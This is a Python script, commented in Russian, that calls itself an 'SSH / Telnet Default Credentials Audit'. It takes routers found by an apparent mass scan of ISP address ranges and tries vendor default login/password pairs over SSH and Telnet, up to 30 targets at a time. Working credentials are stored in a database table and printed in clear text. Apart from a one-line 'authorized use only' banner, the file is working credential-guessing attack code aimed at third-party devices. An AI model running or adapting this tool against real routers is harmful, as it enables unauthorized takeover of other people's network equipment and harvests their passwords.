#!/usr/bin/env python3
"""
SSH / Telnet Default Credentials Audit
=======================================
Проверяет открытые порты SSH (22) и Telnet (23) роутеров из scan_routers
на заводские/популярные пары логин/пароль (fast-набор, как в raw-аудите).

Каналы:
  * SSH   — paramiko (ClientTransport + auth_password), таймаут 5с.
  * Telnet — telnetlib (RFC854), авторизация по промптам "login:"/"Password:".

Успешные пары сохраняются в router_credentials (auth_method='ssh'/'telnet').

⚠️ AUTHORIZED USE ONLY — только устройства, к которым есть разрешение.

Usage:
    .venv/bin/python router_ssh_telnet_audit.py [--limit N] [--targets ip1,ip2]
                        [--concurrency 30] [--timeout 5] [--dry-run]
"""

import os
import sys
import asyncio
import sqlite3
import argparse
import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.environ.get("ISP_DB_PATH", os.path.join(BASE_DIR, "isp_cidr.db"))

sys.path.insert(0, BASE_DIR)
import router_auth_check as rac  # creds_for_fast, get_now


def get_now():
    return datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# ---------------------------------------------------------------------------
# SSH check (paramiko, in thread to avoid blocking the loop)
# ---------------------------------------------------------------------------
def ssh_try(ip, port, user, pwd, timeout):
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=user, password=pwd,
                       timeout=timeout, banner_timeout=timeout,
                       auth_timeout=timeout, allow_agent=False,
                       look_for_keys=False)
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, OSError, EOFError):
        return None  # не ошибка пароля (протокол/сеть) — пропустить
    except Exception:
        return None
    finally:
        try:
            client.close()
        except Exception:
            pass


async def check_ssh(ip, port, creds, timeout):
    loop = asyncio.get_event_loop()
    for user, pwd in creds:
        ok = await loop.run_in_executor(None, ssh_try, ip, port, user, pwd, timeout)
        if ok is True:
            return (user, pwd), "ssh"
        if ok is None:
            return None, "ssh-error"
    return None, "ssh"


# ---------------------------------------------------------------------------
# Telnet check (telnetlib in thread)
# ---------------------------------------------------------------------------
def telnet_try(ip, port, user, pwd, timeout):
    import telnetlib
    try:
        tn = telnetlib.Telnet(ip, port, timeout=timeout)
    except Exception:
        return None
    try:
        # ждём логин-промпт (login: / Username: / Логин:)
        idx, _, _ = tn.expect([b"login:", b"Username:", b"user name:", b"\x4c\x6f\x67\x69\x6e"], timeout=timeout)
        if idx < 0:
            return None
        tn.write(user.encode() + b"\r\n")
        idx, _, _ = tn.expect([b"Password:", b"password:", b"passwd:"], timeout=timeout)
        if idx < 0:
            return None
        tn.write(pwd.encode() + b"\r\n")
        # после ввода пароля: промпт консоли (#, >, $) или снова login (неудача)
        idx, _, _ = tn.expect([rb"[\$#>]\s*$", b"login:", b"Login:", b"incorrect", b"Invalid", b"failed"],
                              timeout=timeout)
        if idx == 0:
            return True
        return False
    except Exception:
        return None
    finally:
        try:
            tn.close()
        except Exception:
            pass


async def check_telnet(ip, port, creds, timeout):
    loop = asyncio.get_event_loop()
    for user, pwd in creds:
        ok = await loop.run_in_executor(None, telnet_try, ip, port, user, pwd, timeout)
        if ok is True:
            return (user, pwd), "telnet"
        if ok is None:
            return None, "telnet-error"
    return None, "telnet"


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------
def fetch_targets(conn, only_ports=(22, 23), limit=None, targets=None):
    cur = conn.cursor()
    if targets:
        rows = []
        for ip in targets:
            rows.append(cur.execute("SELECT ip, port, vendor, model, device_type, extra_ports "
                                    "FROM scan_routers WHERE ip = ?", (ip,)).fetchone())
        return [r for r in rows if r]
    # роутеры с открытыми 22/23 в extra_ports
    rows = cur.execute("SELECT ip, port, vendor, model, device_type, extra_ports FROM scan_routers").fetchall()
    out = []
    for r in rows:
        ip, port, vendor, model, dtype, extra = r
        if not extra:
            continue
        import json
        try:
            ports = json.loads(extra)
        except Exception:
            continue
        if any(p in ports for p in only_ports):
            out.append((ip, port, vendor, model, dtype, ports))
        if limit and len(out) >= limit:
            break
    return out


async def main_async(targets, creds_map, concurrency, timeout):
    sem = asyncio.Semaphore(concurrency)
    results = []
    done = 0
    total = len(targets)

    async def worker(ip, port, vendor, creds):
        nonlocal done
        async with sem:
            if 22 in targets_ports.get(ip, []):
                found, meth = await check_ssh(ip, 22, creds, timeout)
                if found:
                    results.append((ip, 22, vendor, found[0], found[1], "ssh"))
            if 23 in targets_ports.get(ip, []):
                found, meth = await check_telnet(ip, 23, creds, timeout)
                if found:
                    results.append((ip, 23, vendor, found[0], found[1], "telnet"))
            done += 1
            if done % 5 == 0 or done == total:
                print(f"  🔄 [{done}/{total}] найдено: {len(results)}")

    await asyncio.gather(*[worker(ip, port, vendor, creds_map.get(vendor or "", creds_map.get("Generic DSL Router", [])))
                           for ip, port, vendor, *_ in targets])
    return results


targets_ports = {}


def main():
    parser = argparse.ArgumentParser(description="SSH/Telnet default creds audit")
    parser.add_argument("--limit", type=int)
    parser.add_argument("--targets", help="Comma-separated IPs")
    parser.add_argument("--concurrency", type=int, default=20)
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    conn = sqlite3.connect(DB_PATH)
    targets = fetch_targets(conn, limit=args.limit, targets=args.targets.split(",") if args.targets else None)
    conn.close()
    if not targets:
        print("Нет целей (роутеров с открытыми 22/23).")
        return

    global targets_ports
    targets_ports = {ip: [p for p in ports if p in (22, 23)] for ip, _, _, _, _, ports in targets}
    print(f"🔍 Целей: {len(targets)} (SSH:{sum(1 for p in targets_ports.values() if 22 in p)}, "
          f"Telnet:{sum(1 for p in targets_ports.values() if 23 in p)})")
    if args.dry_run:
        for ip, _, vendor, _, _, ports in targets:
            print(f"   {ip:<16} {vendor or '-':<16} {[p for p in ports if p in (22,23)]}")
        return

    extra = rac.load_extra_creds()
    creds_map = {}
    vendors = set(v for _, _, v, *_ in targets)
    for v in vendors:
        creds_map[v] = rac.creds_for_fast(v or "Generic DSL Router", extra)
    avg = sum(len(c) for c in creds_map.values()) // max(1, len(creds_map))
    print(f"   пар на устройство (fast): ~{avg}")

    results = asyncio.run(main_async(targets, creds_map, args.concurrency, args.timeout))

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    now = get_now()
    saved = 0
    for ip, port, vendor, user, pwd, meth in results:
        cur.execute("""
            INSERT OR IGNORE INTO router_credentials
            (ip, ip_int, port, vendor, model, device_type, username, password,
             auth_method, http_status, realm, checked_at, agent_id, machine_id)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        """, (ip, None, port, vendor, None, None, user, pwd, meth, None, None,
              now, os.environ.get("AGENT_ID", "Agent-Arena-01"),
              os.environ.get("MACHINE_ID", "aios-server")))
        saved += cur.rowcount
    conn.commit()
    conn.close()

    print(f"\n✅ Найдено пар: {saved}")
    for ip, port, vendor, user, pwd, meth in results:
        print(f"   НАХОДКА: {ip}:{port} {vendor or '-'} {user}/{pwd or '(пусто)'} ({meth})")


if __name__ == "__main__":
    main()
